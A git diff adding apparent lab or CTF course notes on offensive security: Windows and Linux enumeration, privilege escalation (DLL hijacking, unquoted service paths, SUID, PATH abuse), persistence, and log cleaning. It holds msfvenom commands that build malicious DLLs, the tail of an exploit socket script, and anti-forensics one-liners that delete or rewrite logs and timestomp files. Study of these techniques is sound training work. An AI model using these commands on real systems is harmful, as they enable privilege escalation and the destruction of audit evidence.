@@ -489,8 +489,269 @@ s.connect(("10.50.153.200", 9999)) #connect to target IP and port
 print s.recv(1024) #print response
 s.send(buf) #send the value of buf
 
-####################################### POST EXPLOITATION #################################################################3
+####################################### POST EXPLOITATION #################################################################
+LOCAL HOST ENUMERATION
+user enumeration -to gain privilege.  net user, cat /etc/passwd
+process Enumeration                    tasklist /v, ps -elf
+service enumeration                    tasklist /svc, chkconfig, systemctl --type=service
+Network connection Enumeration         ipconfig /all, ifconfig  -a, ip a
+
+############################# WINDOWS EXPLOITATION ##############################################################################
+##Modes & Levels##
+Kernel Mode vs User Mode
+Privileged vs Unprivileged
+
+##Windows Access Control Model##
+Access Tokens
+Security Identifier (SID) associations and Token associations
+Security Descriptors
+DACL
+SACL
+ACEs
+
+###DLL Search Order### 
+Executables check the following locations (in successive order):
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+The directory the the Application was run from
+The directory specified in in the C+ function GetSystemDirectory()
+The directory specified in the C+ function GetWindowsDirectory()
+The current directory
+
+Windows Integrity Mechanism
+Integrity Levels
+Untrusted -Anonymous SID access tokens
+Low -Everyone SID access token (World)
+Medium -Authenticated Users
+High -Administrators
+System -System services (LocalSystem, LocalService, NetworkService)
 
 
+User Account Control (UAC)
+Always Notify
+Notify me only when programs try to make changes to my computer
+Notify me only when programs try to make changes to my computer (do not dim my desktop)
+Never notify
+
+AutoElevate Executables
+Requested Execution Levels:
+-asInvoker
+-highestAvailable
+
+
+Privilege Escalation
+-Actions that allow an adversary to obtain a higher level of permissions on a system or network
+
+
+Scheduled Tasks & Services
+Items to evaluate include:
+Write Permissions
+Non-Standard Locations
+Unquoted Executable Paths
+Vulnerabilities in Executables
+Permissions to Run As SYSTEM
+
+
+
+###PRIV ESC PROGRAMS                                                         #################################################################
+##Registry
+Regedit or regquery
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+Audit Logging
+auditpol /get /category:* | findstr /i "success failure"     #Show all audit category settings in the first part before the PIPE
+
+Finding vulnerable Scheduled Tasks
+schtasks /query /fo LIST /v
+task schedule program - only need the action colum and triggers
+services program -if you don't see a description (program might be bad research it)          ##############IMPORTANT############
+
+VIEW EVENTS
+event viewer ##IMPORTANT###
+(get-process | where-object -propoerty processname -like "putty*").kill()
+
+##View hidden items
+file explorer > view > check hidden items 
+
+#executable replacement 
+rename the the executable then rename something else to the executable so that its runs instead of what wa schedule to run.
+
+
+msfvemnom -p windows/exec CMD=' cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+
+
+DEMO: Checking UAC Settings
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+DEMO: DLL Hijacking
+Identify Vulnerability
+Take advantage of the default search order for DLLs
+NAME_NOT_FOUND present in executable’s system calls
+Validate permissions
+Create and transfer Malicious DLL
+
+DEMO: Finding Vulnerable Services
+wmic service list full
+sc query
+
+
+DEMO: Vulnerable services
+Identify Vulnerability
+Validate permissions
+Validate Executable Paths
+Replace with Malicious File
+
+
+Other Vulnerabilities
+Unpatched Kernel Vulnerabilities
+Unpatched Systems
+Unpatched Applications
+
+
+DEMO: SYSTEM Access and Defeating Protections
+The objective of this is to provide yourself unrestricted access to a system, and identify methods to execute malicious activity, through a basic command line prompt
+Sysinternals
+Schedule Task
+UAC Bypass
+
+Persistance
+System changes or binary uploads that provide the adversary continued access to system
+Survives:
+Reboots
+Credential changes
+DHCP IP reassignment
+Etc.
+
+Considerations include:
+File naming
+File location
+Timestomping
+Port selection
+
+
+System usage commands
+wmic
+net
+netstat
+
+Important Microsoft Event IDs
+4624/4625 -Successful/failed login
+4720 -Account created
+4672 -Administrative user logged on
+7045 -Service created
+
+DEMO: Event Logging
+Storage: c:\windows\system32\config\
+File-Type: .evtx/.evt
+wevtutil el
+wmic ntevent where "logfile="<LOGNAME>" list full
+Get-Eventlog -List
+
+PowerShell Logging
+Windows CLI CMD history is per instance (doskey /history)
+
+
+op notes
+ ssh -MS /tmp/jump student@10.50.12.19 
+
+msfvenom -p windows/exec CMD='cmd.exe /C "type C:\Users\Admin\Desktop\flag.txt" > C:\Users\comrade.WIN2-INTERNAL-D\Desktop\yap1.txt' -f dll > hijackmeplz.dll
+
+########################################## LINUX EXPLOITATION ############################################################
+etc/sudoers -sudo config files 
+
+WAYS TO FIGURE OUT INIT TYPE
+ls -latr /proc/1/exe
+stat /sbin/init
+man init
+init --version
+ps 1
+
+AUDITING SYSTEMV
+ausearch: Pulls from audit.log
+ausearch -p 22
+ausearch -m USER_LOGIN -sv no
+ausearch -ua edwards -ts yesterday -te now -i
+
+SYSTEMD 
+Utilzes journalctl
+journalctl _TRANSPORT=audit
+journalctl _TRANSPORT=audit | grep 603
+
+
+LOGS FOR COVERING TRACKS
+ -Logs typically housed in /var/log & useful logs:
+auth.log/secure -Logins/authentications
+lastlog -Each users' last successful login time
+btmp -Bad login attempts
+sulog -Usage of SU command
+utmp -Currently logged in users (W command)
+wtmp -Permanent record on user on/off
+
+WORKING WITH LOGS
+file /var/log/wtmp
+find /var/log -type f -mmin -10 2> /dev/null
+journalctl -f -u ssh
+journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
+
+READING FILES
+cat /var/log/auth.log | egrep -v "opened|closed"
+awk '/opened/' /var/log/auth.log
+last OR lastb OR lastlog
+strings OR dd            # for data files
+more /var/log/syslog
+head/tail
+
+CLEANING THE LOGS (BASIC)
+rm -rf /var/log/...   Get rid of it 
+cat /dev/null > /var/log/...  clear the logs
+echo > /var/log/...
+
+CLEANING THE LOGS(PRECISE)
+egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2   -grep(remove)
+cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log sed(replace)
+
+
+TIMESTOMP (NIX)
+touch -c -t 201603051015 1.txt   # Explicit
+touch -r 3.txt 1.txt    # Reference
+
+REMOTE LOGGING
+ -rsyslog
+Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
+Older version only uses /etc/rsyslog.conf
+-Find out:  grep "IncludeConfig" /etc/rsyslog.conf
+##############EXAMPLE##########
+kern.*                                                # All kernel messages, all severities
+mail.crit
+cron.!info,!debug
+*.*  @192.168.10.254:514                                                    # Old format
+*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
+#mail.*
+
+################################Linux Privesc Demos############################################
+####SUDO DEMO
+
+id                    #run as you get on the box
+sudo -l                #List sudo permissions
+https://gtfobins.github.io
+
+### SUID
+ls -latr to check permisssion of a file or directory
+find / -type f -perm /4000 -ls 2>/dev/null
+
+###SGID
+find / -type f -perm /2000 -ls 2>/dev/null
+
+BOTH####
+find / -type f -perm /6000 -ls 2>/dev/null
+
+##### . IN PATH ################
+ech0 $PATH
+PATH=.:$PATH
+
+cover - log Sanitization 1  07f4, 8054    md5sum of one of the ctf 
+priv 1 enumerate - 
 
                                                
